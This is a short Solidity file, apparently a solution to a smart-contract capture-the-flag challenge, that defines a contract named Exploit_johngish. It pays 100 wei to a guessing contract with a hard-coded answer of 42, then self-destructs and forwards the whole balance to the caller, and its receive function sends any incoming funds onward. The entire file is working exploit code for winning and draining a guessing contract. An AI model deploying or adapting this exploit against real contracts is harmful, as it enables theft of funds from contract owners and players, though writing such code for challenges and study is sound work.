// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "hardhat/console.sol";

interface IChallenge_johngish {
    function guess(uint8 n) external payable;
}

interface ILollercoaster_johngish {
    function randInt(uint256 n) external view returns (uint256);
}

contract Exploit_johngish {
    IChallenge_johngish instance;

    constructor(IChallenge_johngish _instance) {
        instance = _instance;
    }

    function finalize() external payable {
        require(msg.value >= 100 wei);

        instance.guess{value: 100 wei}(42);

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        payable(msg.sender).call{value: address(this).balance}("");
    }
}
